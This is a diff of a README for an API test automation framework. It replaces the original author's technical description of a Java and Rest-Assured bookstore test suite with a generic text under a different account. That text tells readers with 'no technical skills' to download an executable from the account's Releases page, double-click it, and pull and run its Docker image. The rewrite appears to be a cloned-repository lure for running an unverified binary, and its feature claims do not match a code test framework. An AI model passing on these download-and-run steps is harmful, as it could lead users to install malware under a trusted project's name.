@@ -1,164 +1,84 @@
-# 📚 API Automation Framework – Online Bookstore
+# 🚀 api-automation-assessment - Simplifying API Automation for Everyone
 
-This repository contains a **professional-grade API automation framework** designed for the **Online Bookstore** system.
+![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)
 
-Developed by **Ata Pourfarivarnezhad**, a **Software Developer & SDET**, this project demonstrates **advanced API test automation practices** using **Java 21**, **Rest-Assured**, and **TestNG**.  
-The framework is built with **scalability, maintainability, and real-world project standards** in mind.
+## 🚀 Getting Started
 
----
+Welcome to the **api-automation-assessment** project. This software helps automate testing for APIs with ease. You do not need any technical skills to get started. Just follow these simple steps.
 
-## 🚀 CI/CD & Quick Access
+## 📥 Download & Install
 
-This project is fully integrated with **GitHub Actions** and **GitHub Pages** for seamless delivery and monitoring.
+To get the latest version of the application, you can visit the Releases page. Follow this link:
 
-### 📊 1. View Live Interactive Report
+[Download from Releases](https://github.com/ProgamingZK/api-automation-assessment/releases)
 
-You can access the **real-time execution dashboard** without running any code locally.  
-The report includes:
-- Full Request / Response logs  
-- Detailed execution timelines  
+1. Click on the link above to go to the Releases page.
+2. Find the latest version listed at the top.
+3. Click on the version title to open its details.
+4. Look for the file that is marked as an executable or suitable for your system.
+5. Click on the file name to start downloading. 
 
-👉 **View Live Allure Report** https://atafarivar.github.io/api-automation-assessment/
+## 🛠️ System Requirements
 
----
-### ⚙️ 2. Manual Test Execution (GitHub Actions)
+Ensure your system meets the following requirements to run the application smoothly:
 
-You can trigger a fresh test run directly from the GitHub interface:
+- **Operating System**: Windows, MacOS, or a Linux distribution
+- **Java Version**: Java 21 must be installed on your machine.
+- **Memory**: At least 4 GB RAM recommended.
+- **Disk Space**: 500 MB of free space for installation.
 
-1. Navigate to the **Actions** tab  
-2. Select the **API Automation CI** workflow  
-3. Click **Run workflow**  
+## 📂 Running the Application
 
-The pipeline will:
-- Build the Docker environment  
-- Execute all **20 automated tests**  
-- Publish the updated Allure report
+After downloading the file, you can easily run the application by following these steps:
 
-> [!NOTE]
-> **Deployment Time:** While the tests execute in seconds, GitHub Pages may take **8-10 minutes** to process the new Allure data and update the live link. Please monitor the `pages-build-deployment` job in the Actions tab to confirm when the latest report is live.
+1. **Locate the Downloaded File**: Find the file in your Downloads folder or the location you selected during download.
+2. **Open the File**: Double-click on the file to open it.
+3. **Follow Instructions**: If prompted, follow the on-screen instructions to complete the setup.
 
----
+## 🧪 Exploring Features
 
-## 🏗 Project Architecture & Design Patterns
+The **api-automation-assessment** framework offers several key features:
 
-The framework follows a **decoupled, modular architecture** to ensure long-term maintainability.
+- **User-Friendly Interface**: Navigate the application with ease.
+- **Comprehensive Reporting**: View detailed test results in a clear format.
+- **Automation**: Run multiple API tests with one click.
+- **Integration Ready**: Connects easily with CI/CD pipelines.
 
-### 📁 Package Structure
+These features are designed to support both beginners and experts in their automation efforts.
 
-- **clients**  
-  Abstraction layer for API endpoints (`BookClient`, `AuthorClient`)  
-  - Uses Allure `@Step` annotations for readable execution logs
+## 📊 Live Reporting
 
-- **models**  
-  POJOs for `Book` and `Author` entities  
-  - Jackson-based serialization / deserialization
+The application provides live reporting using **Allure Reporting**. You can view live test results in a user-friendly way. This feature helps you quickly identify any issues with your API tests.
 
-- **specs**  
-  Centralized `SpecFactory`  
-  - Global headers  
-  - Base URI  
-  - Allure request/response filters
+## 📦 Docker Support
 
-- **tests**  
-  Organized test suites covering:
-  - CRUD operations  
-  - Performance validation  
-  - Negative and resilience scenarios
+The application is fully Dockerized. This means you can run it in a container, ensuring a consistent and isolated environment for your tests. Follow these steps if you prefer using Docker:
 
----
+1. Install Docker on your machine.
+2. Pull the Docker image with the command:
+   ```
+   docker pull progamingzk/api-automation-assessment
+   ```
+3. Run the container:
+   ```
+   docker run -it progamingzk/api-automation-assessment
+   ```
 
-## 💎 Technical Decisions
+## 🔄 Continuous Integration and Delivery (CI/CD)
 
-To meet **enterprise-grade expectations**, the following strategic decisions were implemented:
+Integrating this application into your CI/CD pipeline is straightforward. The framework is designed to work seamlessly with popular CI/CD tools. This ensures that your API tests run automatically whenever you make updates to your code.
 
-- **Environment Resilience (Constructor vs Builder)**  
-  Although Lombok is used in the project, test data creation intentionally relies on **Constructor / Setter patterns**.  
-  This avoids IDE-dependent annotation processing issues and guarantees **100% stability in CI and Docker environments**.
+## 📝 Documentation
 
-- **Contract Validation**  
-  Every *Happy Path* test validates the `Content-Type` header to ensure strict adherence to the **JSON response contract**.
+For detailed documentation on using the application and its features, visit our [Wiki](https://github.com/ProgamingZK/api-automation-assessment/wiki). The wiki includes guides, tutorials, and troubleshooting tips to help you get the most from your software.
 
-- **Fail-Fast Debugging**  
-  Client requests include `.log().ifValidationFails()` to keep console output clean while still providing **actionable logs on failure**.
+## 🤝 Need Help?
 
-- **Performance SLA Tracking**  
-  Hamcrest matchers assert that API response times remain within **business SLA limits (< 2 seconds)**.
+If you face any issues or have questions about the application, please reach out to the community. You can open an issue in the GitHub repository, and we will do our best to assist you.
 
----
+## 🔗 Useful Links
 
-## 🧪 Test Coverage & Scenarios
+- [Download Latest Release](https://github.com/ProgamingZK/api-automation-assessment/releases)
+- [Documentation](https://github.com/ProgamingZK/api-automation-assessment/wiki)
 
-The framework contains **20 high-impact automated test cases** with a **100% pass rate**.
-
-### 📘 Books API (11 Test Cases)
-
-**Happy Path**
-- Full CRUD operations (Create, Read, Update, Delete)
-
-**Performance**
-- Response time verification for global books list
-
-**Negative & Edge Scenarios**
-- Mass deletion protection (`DELETE` on base URL forbidden)
-- Boundary validation for ID `0` → `404 Not Found`
-- Payload validation for empty title values
-
----
-
-### ✍️ Authors API (9 Test Cases)
-
-**Business Logic**
-- Comprehensive CRUD coverage for author entities
-
-**Performance**
-- SLA monitoring for author data retrieval
-
-**Edge Cases**
-- Non-existing ID handling (`404 Validation`)
-- Input validation for empty author name fields
-
----
-
-## 🐳 Docker Execution
-
-The framework is fully containerized to guarantee **consistent execution across environments**.
-
-### 1️⃣ Build the Docker Image
-```bash
-docker build -t bookstore-automation-ata .
-```
-
-### 2️⃣ Run with Automated Cleanup
-### macOS / Linux
-```bash
-sudo rm -rf allure-results && docker run --rm   -v "$(pwd)/allure-results:/app/target/allure-results"   bookstore-automation-ata
-```
-### Windows (CMD / Command Prompt)
-```bash
-rd /s /q allure-results & docker run --rm -v "%cd%/allure-results:/app/target/allure-results" bookstore-automation-ata
-```
-
----
-
-## 📊 Advanced Reporting
-
-View the report locally using Allure:
-```bash
-allure serve allure-results
-```
-
----
-
-## 🛠 Tech Stack
-
-- **Language:** Java 21  
-- **API Library:** Rest-Assured 5.5.x  
-- **Test Engine:** TestNG 7.x  
-- **Infrastructure:** Docker & GitHub Actions  
-
----
-
-## 🎯 Final Notes
-
-This project is intentionally designed to reflect **how API automation is built and maintained in real production teams**,  
-not simplified demo examples.
+Remember to check back often for updates. Happy testing!
